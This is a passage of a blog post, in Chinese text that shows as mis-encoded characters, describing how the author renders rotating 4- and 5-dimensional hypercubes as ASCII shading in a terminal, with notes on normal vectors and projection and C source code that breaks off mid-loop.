        <content type="html"><![CDATA[<p>Meet Hypercubes~ O(âˆ©_âˆ©)O</p><p>ğŸ¦è¯­è¨€æ¸²æŸ“nç»´ç«‹æ–¹ä½“è‡³ç»ˆç«¯ï¼Œé‚£çœŸæ˜¯éå¸¸amazingå•Š</p><img src="/images/4Hypercube-transparent.gif" height="200" width="200" /><span id="more"></span><h1 id="Hello-Dimension"><a href="#Hello-Dimension" class="headerlink" title="Hello Dimension"></a>Hello Dimension</h1><p align="right"><small>So all this just to render a cube on your terminal ?</small></p><blockquote><p>åæ¥åšæˆå·¥ç¨‹æ¦‚è®ºå¤§ä½œä¸šçš„<a href="https://kyriota.com/html/hypercube/">ç½‘é¡µç‰ˆæœ¬</a>(æ‰‹æœºæ…ç‚¹)ï¼Œä½¿ç”¨äº†<code>threejs</code>è¿™ä¸ªå›¾å½¢åº“æ¥ç»˜åˆ¶å’Œæ‰“å…‰ï¼Œæ¯”èµ·æ§åˆ¶å°æ¥è¯´è™½ç„¶ä¸é‚£ä¹ˆgeekï¼Œä½†æ˜¯ç¨å¾®æ›´ç›´è§‚é‚£ä¹ˆäº¿ç‚¹ï¼Œåº”è¯¥è¿˜å­˜åœ¨ä¸€äº›bugï¼Œä½†æ˜¯3ï¼Œ4ï¼Œ5ç»´ä¸‹åº”è¯¥æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜</p></blockquote><p>å°é¢gifä¸ºè¶…ç«‹æ–¹ä½“ç»•xwä¸xzè½´çš„æ—‹è½¬ï¼Œè‡³äºç»“æœçš„æ­£ç¡®æ€§ï¼Œæˆ‘å‚ç…§äº†wikiä¸”è‡ªè®¤ä¸ºæ— è¯¯ï¼Œä¾‹å¦‚ä¸‹å›¾å°±æ˜¯ä¸€äº›ä¸è¶…ç«‹æ–¹ä½“ç›¸å…³çš„å›¾ç‰‡</p><center><table>    <tr>        <td ><center><img src="/images/HypercubeStructure.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“è§£æ„</center></td>        <td ><center><img src="/images/wikiHypercube.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“ç»•xwè½´æ—‹è½¬</center></td>    </tr></table></center>ä¸å¦¨å…ˆæ¥çœ‹çœ‹æˆ‘çš„ä»£ç éƒ½æ¸²æŸ“å‡ºäº†äº›ä»€ä¹ˆï¼š<table><thead><tr><th>å›¾åƒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><img src="/images/4HypercubeOpen.gif" width=500 height=500></td><td>æ­¤ä¸ºåœ¨<a href="https://kyriota.com/2021/04/19/Render3D-ObjectInTerminal/">RenderÂ 3DÂ ObjectÂ InÂ Terminal</a>åŸºç¡€ä¸Šä¿®æ”¹çš„ä»£ç ï¼Œé™äºæ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å†™çš„ç¨€çƒ‚è€Œæ— æ³•æ‹“å±•åˆ°æ›´é«˜çš„äº”ç»´ï¼Œä¸”ç”±äºæ³•å‘é‡å¹¶éå®æ—¶è®¡ç®—è€Œæ˜¯æ‰‹åŠ¨è®¾ç½®ï¼Œå¯¼è‡´æ—‹è½¬æ—¶çš„â€å››ç»´é¢â€œæ¸²æŸ“é”™è¯¯ï¼ˆå°±æ˜¯gifä¸­çœ‹è§æ˜æ˜¾æ˜¯ä¸ªæ­£æ–¹ä½“ä½†æ˜¯å´æ²¡æœ‰æ­£ç¡®çš„æ‰“å…‰çš„ä¸€å¨åè¿‡æ¥åå›å»çš„ä¸œè¥¿ï¼‰</td></tr><tr><td><img src="/images/4Hypercube.gif" width=500 height=500></td><td>åæ¥å¯¹æ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å¤§æ”¹ï¼Œå¼•å…¥é¡¶ç‚¹æ¨¡å‹å¹¶å®æ—¶è®¡ç®—æ³•å‘é‡ï¼Œæ­£ç¡®æ¸²æŸ“å‡ºäº†è¿™ä¸ªè¶…ç«‹æ–¹ä½“</td></tr><tr><td><img src="/images/5Hypercube.gif" width=500 height=500></td><td>åœ¨å››ç»´å‡äº”ç»´æ—¶åˆå‡ºç°äº†ä»£ç é€šç”¨æ€§çš„é—®é¢˜ï¼Œå‘ç°äº”ç»´æ—¶å­˜åœ¨å¤šå¤„ä¸‰è§’å½¢çš„å„é¡¶ç‚¹å‡ ä¹ä½äºåŒä¸€ç›´çº¿çš„æƒ…å†µï¼Œå¯¹åˆ¤æ–­è´¨å¿ƒä¸ç›´çº¿å…³ç³»çš„æ–¹ç¨‹å¼•å…¥ä¸€ä¸ªå¾ˆå°çš„Î”offestè§£å†³æ­¤é—®é¢˜</td></tr></tbody></table><p>æœ€åå†™äº†é€æ˜æè´¨ï¼Œä¸ºäº†æ–¹ä¾¿å’Œå®é™…æ•ˆæœæ²¡æœ‰å¯¹é€æ˜æè´¨è®¡ç®—å…‰ç…§ï¼Œé€æ˜ç‰©ä½“ä»£ç æ¯”ä¸é€æ˜çš„ç®€å•ï¼Œä½†ç¡®å®ä¾¿åˆ©äº†ç†è§£å†…éƒ¨ç»“æ„å˜åŒ–</p><center><table>    <tr>        <td ><center><img src="/images/4Hypercube-transparent.gif" width=200 height=200>é€æ˜å››ç»´ </center></td>        <td ><center><img src="/images/5Hypercube-transparent.gif" width=200 height=200>é€æ˜äº”ç»´</center></td>    </tr></table></center><div class='spoiler collapsed'>    <div class='spoiler-title'>        å¯¹æ¸²æŸ“ä¸æ¨¡å‹çš„æ”¹è¿›å¤§çº²    </div>    <div class='spoiler-content'>        <ul><li><p>ä¸‰è§’å½¢ï¼šå…ˆå‰çš„æ­£æ–¹ä½“å’Œçƒä½“æ¨¡å‹éƒ½æ˜¯å®é™…å­˜åœ¨äºæ•°ç»„ä¸­çš„éå¸¸å¤šçš„ç‚¹ï¼Œæ¯ä¸ªç‚¹ä¸å±å¹•ä¸Šçš„ç‚¹å¯¹åº”ï¼Œä¸ä»…ç©ºé—´å ç”¨å¤šï¼Œç®—åŠ›è·Ÿä¸ä¸Šï¼Œæ³•å‘é‡ä¹Ÿæ˜¯é’ˆå¯¹æ­£æ–¹ä½“å’Œçƒä½“çš„å‡ ä½•æ€§è´¨ä¸ºå…¶æ‰‹åŠ¨å®‰æ’çš„ï¼Œç¼ºä¹æ™®é€‚æ€§</p><ul><li>è§£å†³ï¼šå¯¹äºæ­£æ–¹ä½“ï¼Œåªéœ€è¦æ±‚å‡ºæ­£æ–¹ä½“çš„é¡¶ç‚¹ä»¥åŠé¡¶ç‚¹ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼ˆå“ªäº›é¡¶ç‚¹ç›¸é‚»ï¼‰ï¼Œå³å¯ç”±æ­¤æ¨å¾—ä¸‰è§’å½¢ã€å››æ£±é”¥ç­‰ç‹¬ç«‹çš„å±€éƒ¨å›¾å½¢ï¼Œè¿™å¸¦æ¥çš„å¥½å¤„æœ‰ï¼š<ul><li>æ™®é€‚æ€§å¢å¼ºï¼Œå³ä½¿ç‰©ä½“ä¸æ˜¯æ­£æ–¹ä½“ä¹Ÿèƒ½ä»¥æ­¤æ–¹å¼è®¡ç®—ã€æ¸²æŸ“</li><li>æ€§èƒ½æå‡ï¼Œç»´åº¦å¾—ä»¥å‡çš„æ›´é«˜ï¼Œè®¡ç®—é€Ÿåº¦å¿«äº†äº¿ç‚¹ç‚¹</li><li>å¯ä»¥é€šè¿‡è®¡ç®—å±€éƒ¨è´¨å¿ƒå‡†ç¡®åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Œä½†æ˜¯æ­¤å¤„çš„æ­£æ–¹ä½“æ˜¯å‡¸å‡ ä½•ä½“ï¼Œç›´æ¥ä»¥åŸç‚¹ï¼ˆæ­£æ–¹ä½“è´¨å¿ƒï¼‰åŒºåˆ†å†…å¤–æ³•å‘é‡ä¹Ÿæ˜¯è¶³å¤Ÿçš„</li></ul></li></ul></li><li><p>å†…å¤–æ³•å‘é‡ï¼šç°æœ‰ä¸€æ¨¡å‹çš„ç›¸é‚»ä¸‰ç‚¹ç¡®å®šçš„å¹³é¢ABCï¼Œå¦‚ä½•åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Ÿ</p><ul><li><p>è§£å†³ï¼šå› ä¸ºæˆ‘é¢å¯¹çš„å¯¹è±¡æ˜¯æ­£æ–¹ä½“ï¼Œæ‰€ä»¥åªè¦å¯¹ä»»æ„é¡¶ç‚¹å‘é‡åŠ ä¸Šæ³•å‘é‡ï¼Œå°†ä½œæ­¤åç§»åçš„å‘é‡ä¸å…¶å¯¹åº”é¡¶ç‚¹å‘é‡æ¯”è¾ƒæ¨¡é•¿å¤§å°ï¼Œå³å¯åˆ¤æ–­å†…å¤–æ³•å‘é‡</p><img src="/images/HelloDimension_å¤–æ³•å‘é‡.jpg" width=200 height=200><p>ä½†è¿™æ ·ä¼šåœ¨å‡¹å‡ ä½•ä½“ä¸Šæœ‰è¯¯</p><img src="/images/HelloDimension_å…¨å±€è´¨å¿ƒ.jpg" width=200 height=200><p>æ‰€ä»¥æ™®é€‚çš„åšæ³•åº”æ˜¯å†å¯»æ‰¾ä¸€ä¸ªç›¸é‚»é¡¶ç‚¹ï¼Œç¡®å®šä¸€ä¸ªå››é¢ä½“ï¼Œè®¡ç®—æ­¤å››é¢ä½“è´¨å¿ƒï¼Œç„¶åä»¥æ­¤è´¨å¿ƒä¸ºåŸºå‡†ä½œåŒæ ·çš„åç§»åçš„æ¨¡é•¿æ¯”è¾ƒ</p></li></ul></li><li><p>é€è§†æŠ•å½±ï¼šäººçœ¼è§‚å¯Ÿç‰©ä½“æ˜¯å°å­”æˆåƒï¼Œé€è§†æŠ•å½±ï¼Œæ­£æŠ•å½±ä¼šç¼ºå°‘è¿‘å¤§è¿œå°çš„ç‰¹å¾ï¼Œä¸”åªæœ‰åœ¨é™ç»´æ—¶é€è§†æŠ•å½±æ‰èƒ½ä½¿é«˜ç»´å‡ ä½•ä½“æŠ•å½±å‡ºä»¤äººæ»¡æ„çš„æ•ˆæœï¼ˆå¦åˆ™å°±æ˜¯é»æˆä¸€å¨æ‰­æ¥æ‰­æ›²ï¼Œæ²¡æœ‰å¤§å°å˜åŒ–ï¼‰ï¼Œé€è§†æŠ•å½±çš„æŠ•å½±çŸ©é˜µé€šè¿‡ä¸€ä¸ªç›¸ä¼¼ä¸‰è§’å½¢å°±å‡ºæ¥äº†ï¼Œç‚¹åˆ°ä¸ºæ­¢</p></li><li><p>åŠé€æ˜æè´¨ï¼šå°±ç®€ä¸å°±ç¹ï¼Œå†ç²¾è‡´çš„é€æ˜æè´¨åœ¨ç»ˆç«¯ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œæˆ‘çš„åšæ³•æ˜¯ä¸å†è®¡ç®—æ³•å‘é‡ï¼Œå‘ç°æŠ•å½±åˆ°å±å¹•ä¸Šçš„é¢æœ‰å‡ ä¸ªï¼Œè¯¥ç‚¹çš„alphaå°±åŠ åˆ°å‡ ï¼Œç„¶ååº”ç”¨ä¸‹é¢è¿™ä¸ªå¼å­æŠŠalphaæ¢å› [0,1) å†…ï¼ˆæ•´ä¸ªå¹‚ä¸»è¦æ˜¯æƒ³è®©æ›²çº¿å¹³æ»‘ä¸€ç‚¹ï¼Œå»æ‰ä¹Ÿå¯ä»¥ï¼‰</p>  <center><code>alpha=1-1/(k*alpha+1)^3/2</code></center></li></ul>    </div></div><p>ä»¥ä¸‹æ˜¯æœ€ç»ˆçš„æºç ï¼Œé‡è¦å‚æ•°å…¨éƒ¨åœ¨defineæˆ–å…¨å±€å˜é‡ä¸­</p><blockquote><p>åè®°ï¼šçªç„¶å‘ç°æœ‰ä¸€å¤„ç”¨äº†<code>public</code>åšäº†å˜é‡å/æ‚è„¸ï¼Œä½†æ˜¯Cè¯­è¨€æ²¡æœ‰classï¼Œæ‰€ä»¥é‚£é‡Œçš„publicæ˜¯æŒ‡æ¨¡å‹çš„å…¬å…±é¡¶ç‚¹</p></blockquote><div class='spoiler collapsed'>    <div class='spoiler-title'>        ç®€æ´ç‰ˆ    </div>    <div class='spoiler-content'>        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0.6</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;</span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;</span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;</span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;</span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];</span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];</span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];</span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));</span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)</span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)</span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)</span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])</span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;&#125;&#125;&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);&#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])</span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);&#125;</span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];</span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> 